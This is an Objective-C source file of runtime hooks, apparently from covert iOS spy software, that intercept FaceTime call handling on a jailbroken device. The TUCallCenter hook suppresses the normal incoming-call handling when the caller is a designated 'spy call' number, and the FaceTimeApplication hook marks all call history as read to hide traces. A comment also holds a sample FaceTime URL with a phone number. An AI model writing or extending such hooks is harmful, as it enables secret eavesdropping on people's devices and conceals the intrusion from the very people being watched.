//
//  FaceTimeSpyCallFaceTime.h
//  MSSPC
//
//  Created by Makara on 2/19/14.
//
//

#import "MSSPC.h"
#import "FaceTimeCall.h"
#import "FaceTimeSpyCallUtils.h"

#import "PhoneApplication.h"
#import "FaceTimeApplication.h"
#import "PhoneApplication+FaceTime+IOS7.h"

#import "CNFConferenceController.h"
#import "CNFConferenceController+IOS6.h"
#import "CNFConferenceController+IOS7.h"

// iOS 8
#import "TUCallCenter.h"
#import "TUCall.h"
#import "TUCall+iOS8.h"
#import "TUFaceTimeCall.h"
#import "PhoneApplication+FaceTime+iOS8.h"
#import "FaceTimeApplication.h"
#import "FaceTimeApplication+iOS8.h"
#import "PhoneRootViewController+FaceTime+iOS8.h"
#import "PHFrecentViewController+FaceTime+iOS8.h"
#import "CHManager.h"

#import <UIKit/UIKit.h>

#pragma mark - iOS 8 -

#pragma mark - TUCallCenter

HOOK(TUCallCenter, handleCallStatusChangediPadiPod_FaceTime_InCallService$, void, id arg1) {
    APPLOGVERBOSE(@"handleCallStatusChangediPadiPod_FaceTime_InCallService$, arg1 = %@", arg1);
    
    TUFaceTimeCall *facetimeCall = arg1;
    FaceTimeCall *ftCall = [[[FaceTimeCall alloc] init] autorelease];
	[ftCall setMInviter:nil];
	[ftCall setMIMHandle:nil];
    [ftCall setMIMAVChatProxy:nil];
	[ftCall setMConversationID:[facetimeCall conferenceIdentifier]];
    
    Class $TUFaceTimeAudioCall = objc_getClass("TUFaceTimeAudioCall");
    Class $TUFaceTimeVideoCall = objc_getClass("TUFaceTimeVideoCall");
    if ([facetimeCall isKindOfClass:$TUFaceTimeAudioCall]) {
        [ftCall setMFaceTimeAudioCall:(TUFaceTimeAudioCall *)facetimeCall];
    } else if ([facetimeCall isKindOfClass:$TUFaceTimeVideoCall]) {
        [ftCall setMFaceTimeVideoCall:(TUFaceTimeVideoCall *)facetimeCall];
    }
    
    if ([facetimeCall isOutgoing]) {
        [ftCall setMDirection:kFaceTimeCallDirectionOut];
    } else {
        [ftCall setMDirection:kFaceTimeCallDirectionIn];
    }
    
    APPLOGVERBOSE(@"callStatus,     %d", [facetimeCall callStatus]);
    APPLOGVERBOSE(@"status,         %d", [facetimeCall status]);
    APPLOGVERBOSE(@"isStatusFinal,  %d", [facetimeCall isStatusFinal]);
    
    /*
     Note the status of call here is not the same as regular call
     */
    switch ([facetimeCall callStatus]) {
        case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_INCOMING: {
            if ([FaceTimeSpyCallUtils isFaceTimeSpyCall:[ftCall facetimeID]]) {
                ;
            } else {
                CALL_ORIG(TUCallCenter, handleCallStatusChangediPadiPod_FaceTime_InCallService$, arg1);
            }
        } break;
        case 6: // Often get this status when there is an incoming call & call ended
        case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_DISCONECTED: {
            if ([facetimeCall isStatusFinal]) {
                ;
            }
            CALL_ORIG(TUCallCenter, handleCallStatusChangediPadiPod_FaceTime_InCallService$, arg1);
        } break;
        case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_CONECTED:
        case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_ONHOLD:
        default:
            CALL_ORIG(TUCallCenter, handleCallStatusChangediPadiPod_FaceTime_InCallService$, arg1);
            break;
    }
}

#pragma mark - FaceTimeApplication

HOOK(FaceTimeApplication, applicationDidBecomeActive$, void, id arg1) {
    APPLOGVERBOSE(@"applicationDidBecomeActive$, %@", arg1);
    CALL_ORIG(FaceTimeApplication, applicationDidBecomeActive$, arg1);
    
    /*
    CFStringRef object = CFSTR("com.apple.TelephonyUtilities");
    //CFStringRef object = CFSTR("com.apple.facetime");
    //CFNotificationCenterRef center = CFNotificationCenterGetLocalCenter();
    CFNotificationCenterRef center = CFNotificationCenterGetDarwinNotifyCenter();
    CFNotificationCenterPostNotification(center, CFSTR("kCallHistoryDistributedSaveNotification"), (__bridge void *)object, NULL, true);
    */
    
    PhoneRootViewController *rootViewController = [self performSelector:@selector(rootViewController)];
    PHFrecentViewController *facetimeRecentCallController = [rootViewController performSelector:@selector(faceTimeRecentViewController)];
    CHManager *chManager = [facetimeRecentCallController performSelector:@selector(callHistoryManager)];
    [chManager markAllCallsAsReadWithPredicate:nil];
}

#pragma mark - Below iOS 8 {not used} -

// Url format of FaceTime call pass from SpringBoard to FaceTime application:
// facetime-accept://+66906469301?conferenceID=0D19C16A5B709C18AAF687F836C4937B66259C8A56A6337E

// --- Call only in FaceTime below 3 methods
HOOK(CNFConferenceController, _handleConferenceEnded$withReason$withError$, void, id arg1, unsigned int arg2, int arg3) {
     APPLOGVERBOSE(@"_handleConferenceEnded$withReason$withError$, %@, %@, %d, %d", [arg1 class], arg1, arg2, arg3);
     CALL_ORIG(CNFConferenceController, _handleConferenceEnded$withReason$withError$, arg1, arg2, arg3);
    }

HOOK(CNFConferenceController, _handleConferenceConnecting$, void, id arg1) {
     APPLOGVERBOSE(@"_handleConferenceConnecting$, %@, %@", [arg1 class], arg1);
     CALL_ORIG(CNFConferenceController, _handleConferenceConnecting$, arg1);
    }
 
HOOK(CNFConferenceController, _handleEndAVChat$withReason$error$, void, id arg1, unsigned int arg2, int arg3) {
     APPLOGVERBOSE(@"_handleEndAVChat$withReason$error$, %@, %@, %d, %d", [arg1 class], arg1, arg2, arg3);
     CALL_ORIG(CNFConferenceController, _handleEndAVChat$withReason$error$, arg1, arg2, arg3);
    }
// ---

HOOK(CNFConferenceController, inviteFailedFromIMHandle$reason$, void, id arg1, long long arg2) {
    APPLOGVERBOSE(@"inviteFailedFromIMHandle$reason$, %@, %@, %lld", [arg1 class], arg1, arg2);
    CALL_ORIG(CNFConferenceController, inviteFailedFromIMHandle$reason$, arg1, arg2);
}

HOOK(CNFConferenceController, createdOutgoingIMAVChat$, void, id arg1) {
    APPLOGVERBOSE(@"createdOutgoingIMAVChat$, %@, %@", [arg1 class], arg1);
    CALL_ORIG(CNFConferenceController, createdOutgoingIMAVChat$, arg1);
}